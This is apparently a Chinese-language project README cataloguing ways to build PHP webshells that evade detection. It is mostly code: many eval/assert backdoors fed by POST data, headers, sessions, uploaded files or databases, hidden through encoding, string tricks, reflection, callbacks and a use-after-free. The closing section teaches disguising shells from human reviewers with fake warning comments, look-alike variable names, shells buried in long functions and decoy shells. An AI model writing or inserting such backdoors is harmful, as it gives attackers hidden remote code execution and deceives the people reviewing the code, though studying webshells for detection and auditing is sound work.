# 前言
此项目虽然是免杀shell，但跟代码审计密切相关，有些免杀方法就是真实漏洞的一部分简化，故打算长期沉淀，把自己看到、想到的更新在此。

大概如下四部分：

1、source

2、数据流

3、sink

4、面向人的免杀

这里有的一提的是面向人的免杀，检测工具易过，但是人一看就看得出来。所以也是要免杀人的。

# source

## 直接从变量获取

#### $_SERVER
```php
GET /shell/xx.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 2
code: phpinfo();
Connection: close
```

```php
<?php
eval($_SERVER['HTTP_CODE']);
```


#### $_FILES Content-Type
```
POST /shell/xx.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 180
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjm8AolGAXiYuOHE9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://127.0.0.1/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundaryjm8AolGAXiYuOHE9
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: phpinfo()

11
------WebKitFormBoundaryjm8AolGAXiYuOHE9--

```

```php
<?php
assert($_FILES['file']['type']);
```

#### GLOBALS
```php
<?php
eval($GLOBALS[_POST][code]);
```

## 通过函数二阶获取

#### get_defined_vars
通过end(get_defined_vars()[_POST])获取

```php
assert(end(get_defined_vars()[_POST]));
<?php if($_SERVER[123]){eval(end(get_defined_vars()[_POST]));};?>
```

#### next $GLOBALS
```php
<?php
@$GLOBALS{next} = $GLOBALS[$GLOBALS[func] = current($GLOBALS)[GLOBALS]] = $GLOBALS[$GLOBALS[code] = next($GLOBALS)[GLOBALS]] = $GLOBALS[$GLOBALS{func}($GLOBALS{code})];
?>
```

#### mysqli_connect
还有
smb \\127.0.0.1\1.txt
ftp
等等各种获取
```php
--
-- 表的结构 `code`
--

CREATE TABLE IF NOT EXISTS `code` (
  `code` varchar(255) COLLATE utf8mb4_bin NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- 转存表中的数据 `code`
--

INSERT INTO `code` (`code`) VALUES
('phpinfo();');
```

```php
<?php
eval(mysqli_fetch_assoc(mysqli_query(mysqli_connect('127.0.0.1','root','root','shell'),'select * from code'))['code']);
```

#### file_get_contents
```php
<?php
eval(file_get_contents("http://127.0.0.1/1.txt"));
?>
```

#### php://input
需要开启allow_url_include
```php
eval("php://input");
```

#### file_put_contents文件
```php
<?php
file_put_contents("shell.txt",$_POST[1]);
$code = file_get_contents("shell.txt");
eval($code);
```

#### data:text协议
```php
include "data:text/plain,<?php $_POST[1];?>";
```

d盾0级
```php
<?php
include "data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+.php";
```

#### session
```php
<?php
session_id('shell');
session_start();
$_SESSION["username"]="<?php ".$_POST[1]."?>";
session_write_close();

include session_save_path().'/sess_shell';
```

#### session_id
```php
GET /shell/xx.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 0
Connection: close
Cookie: PHPSESSID=706870696e666f28293b


<?php
session_start();
eval(hex2bin(session_id()));
?>
```

#### tmp_file
```php
<?php
$temp = tmpfile();
print_r($temp);
fwrite($temp, $_POST[1]);
rewind($temp);

//phpD722.tmp
eval(fread($temp,100));
```

#### $_FILES['file']['tmp_name']
sys_get_temp_dir()
```php
<?php
$filename = $_FILES['file']['tmp_name'];
include $filename;
```

#### upload_progress
需要条件竞争，php脚本无权限设置cleanup为0
```php
POST /shell/xx.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 64016
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOAAgdsu072sFLxAt
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=test
Connection: close

------WebKitFormBoundaryOAAgdsu072sFLxAt
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php phpinfo();?>
------WebKitFormBoundaryOAAgdsu072sFLxAt
Content-Disposition: form-data; name="file1"; filename="lufei.txt"
Content-Type: application/x-zip-compressed

33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
------WebKitFormBoundaryOAAgdsu072sFLxAt--
```

```php
<?php
include session_save_path().'/sess_test';
```
## 语法
#### 参数列表展开
```php
<?php
eval(rtrim(...$_POST));
?>
```

#### 三目运算
```php
<?php
eval(false ? 1 : $_POST[1]);
?>
```

# 数据流

#### uaf
php 5.6测试成功。
```php
<?php
$code = $_POST[1];
$serialized_string = 'a:1:{i:1;C:11:"ArrayObject":37:{x:i:0;a:2:{i:1;R:4;i:2;r:1;};m:a:0:{}}}';
$outer_array = unserialize($serialized_string);
gc_collect_cycles();
$filler1 = "aaaa";
$filler2 = &$code;

eval($outer_array);
?>
```

#### 非等号赋值-数组传递
```php
<?php
$c = array();
array_push($c,$_POST[1]);
eval($c[0]);
?>
```

#### 变量覆盖-parse_str
```php
<?php
parse_str("code=$_POST[1]");
eval($code);
?>
```

#### 变量覆盖-双$
```php
<?php
foreach ($_POST as $key => $value) {
    ${$key} = $value;
}

eval($code);
?>
```


#### 变量覆盖-extract
```php
<?
extract($_GET).$a($b);
```

#### unserialize
```php
<?php
$code=$_POST[1];
$s=base64_decode('YToyOntpOjE7czo2OiJhc3NlcnQiO2k6MjtzOjEwOiJwaHBpbmZvKCk7Ijt9');
$o = unserialize($s);
$o[1]($code);
?>

```

#### pop链
```php
<?php

class Wrapper{
	public $evil;

	function __destruct() {
		$evil = new Evil();
		$evil->func = $_GET['func'];
		$evil->code = $_POST[1];
		$evil."11";
	}
}

Class Evil{
	public $func;
    public $code;

    function __toString() {
        call_user_func($this->func,$this->code);
		return "";
    }
}

$warpper = new Wrapper();
?>
```

#### 回调函数
https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html
```php
$e = $_REQUEST['e'];
$arr = array($_POST[1],);
array_filter($arr, $e);
```

#### 匿名类-new class
```php
<?php
$func = new class('assert') extends ReflectionFunction{};
$func->invoke($_POST[1]);
?>
```

#### trait
```php
trait Evilable {
	public function test($code){
		eval($code);
	}
}

class Legal{
	use Evilable;
}

$evil = new Legal();
$evil->test($_POST[1]);
```

数据源来于类属性
```php
trait Evilable {
	public $code;
	public function test(){
		eval($this->code);
	}
}

class Legal{
	use Evilable;
}


$evil = new Legal();
$evil->code = $_POST[1];
$evil->test($evil->code);
```

#### 自定义路由-工厂模式
```php
<?php
class Evil {
	public $code;
	public function test(){
		eval($this->code);
	}
}

class ClassFactory {
   public function getObject($className){
      return new $className;
   }
}

$classFactory = new ClassFactory();
$evil = $classFactory->getObject("Evil");
$evil->code = $_POST[1];
$evil->test();
?>
```

#### 自定义路由-责任链
```php
<?php

class Chain{
	public $level;
	public $next;

	public function doChain($level,$nothing){
		if($this->level==$level){
			$this->doit($nothing);
		}
		if($this->next!=null){
			$this->next->doChain($level,$nothing);
		}
   }

	public function doit($nothing){
	}
}

class Legal extends Chain{
	public function __construct(){
		$this->level=1;
	}

	public function doit($nothing){
		echo $code;
	}
}

class Evil extends Chain{
	public $code;

	public function __construct(){
		$this->level=2;
	}

	public function doit($nothing){
		eval($this->code);
	}
}

$legal = new Legal();
$evil = new Evil();
$legal->next = $evil;
$evil->next = null;

$evil->code = $_POST[1];
$legal->doChain(2,"");
?>
```

# sink
代码执行的sink和代码流这块有点区别，执行任意代码的属于sink，执行指定代码的是代码流。

## 动态调用-字符串
#### 编码
php7
```php
<?php
"\x61\x73\x73\x65\x72\x74"($_POST[1]);
?>
```

#### 字符串拼接
```php
$func = 'as'.'sert';
$func($_POST[1]);
```

#### 字符串分割
```php
<?php
$code = "eval($####_POST####[1]);";
$code = str_replace("####","",$code);
eval($code);
?>
```

#### 各种运算-异或
```php
<?php
// $func = urlencode(~("assert"));
// print($func);//%9E%8C%8C%9A%8D%8B
$func = "%9E%8C%8C%9A%8D%8B";
$func = ~urldecode($func);

$func($_POST[1]);
?>
```


## eval、assert同效果

#### 回调函数
https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html
```php
$e = $_REQUEST['e'];
$arr = array($_POST['pass'],);
array_filter($arr, $e);
```

#### 文件包含
```php
include('1.txt')
```

#### 双引号
```php
$code = $_POST[1];
$data = "xxxxxxx{${eval($code)}}xxxxxx";
```

#### ob_start
```php
<?php
$func = "system";
$cmd = $_POST[1];
ob_start($func);
echo $cmd;
ob_end_flush();
?>
```

#### create_function
```php
<?php
$code = $_POST[1];
create_function('','1;}eval("'.$code.'");/*');
?>
```


## 二阶获取sink
#### 数组
```php
<?php
$item['func'] = 'assert';
$item['func']($_POST[1]);
?>
```

#### 二维数组

```php
<?php
$item['func'] = 'assert';
$array[] = $item;
$array[0]['func']($_POST[1]);
?>
```

#### get_defined_functions
```php
<?php

$arr = get_defined_functions()['internal'];

print_r(get_defined_functions()['internal']);
echo $arr[841]; //每个版本的assert数字不同， php版本5.6.27为850

$arr[841]($_POST[1]);

```

#### ReflectionFunction
```php
$func = new ReflectionFunction('assert');
print_r($func->invoke($_POST[1]));
```

#### 别名
php7
```php
<?php
use function \assert as test;
test($_POST[1]);
?>
```


## 语法

#### 斜杠
php5.3测试成功
```php
<?php
@eval\($_POST['code']);
?>
```


#### preg_replace-@
5.5
7.0
不再支持/e
```php
<?php
@preg_replace('@(.*)@e','\\1',$_REQUEST[1]);
?>
```


# 流量
这块随便把流量编码或者加密
```php
//1=cGhwaW5mbygpOw==
<?php
eval(base64_decode($_POST[1]));
?>
```

# 面向人的免杀

## 注释
#### 无中生有-假装是正常代码
自己的程序可以不写注释，shell一定要写个假注释
```php
//实例化对象的工厂与测试代码，千万别删除，可能程序导致崩溃或者莫名其妙的bug
<?php
class Test {
    public $code;
    public function test(){
        eval($this->code);
    }
}

class ClassFactory {
   public function getObject($className){
      return new $className;
   }
}

$classFactory = new ClassFactory();
$test = $classFactory->getObject("Test");
$test->code = $_POST[1];
$test->test();
?>
```


## 代码
#### 无中生有
5.5 7.0不再支持/e
```php
<?php
function filter()
{
    // TODO 其他安全过滤
    // 过滤查询特殊字符
    @preg_replace('@test|(.*)|EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN|@e','\\1',$_POST[1]);
}
filter();
?>
```


#### 瞒天过海-正常代码插入shell
插入在比较长的函数代码中
```php
function filter()
{
    $func = 'as'.'sert';
    //其他n多代码
    $code = $_POST[1];
    //其他n多代码
    $func($code);
}
filter();
```

#### 暗渡陈仓-1il
```php
<?php
$ill = $_POST[1];
//其他代码
//.....
//下面两行代码挨着写
$il1 = "echo 'php test'";
eval($ill);
```


#### 声东击西-假的shell
暴露一个明显而隐晦，白色中带黑色shell，另外一个文件写入真正的shell。
```php
//另外一个文件写真正的shell

//密码是1
$code = "eval($####_POST####[1]);";
$code = str_replace("####","",$code);
eval($code);
```

# 参考
maple、SkyBlue永恒、新仙剑之鸣、anlfi、mochazz、yzddMr6s、JamVayne、UltramanGaia等发过的文章。
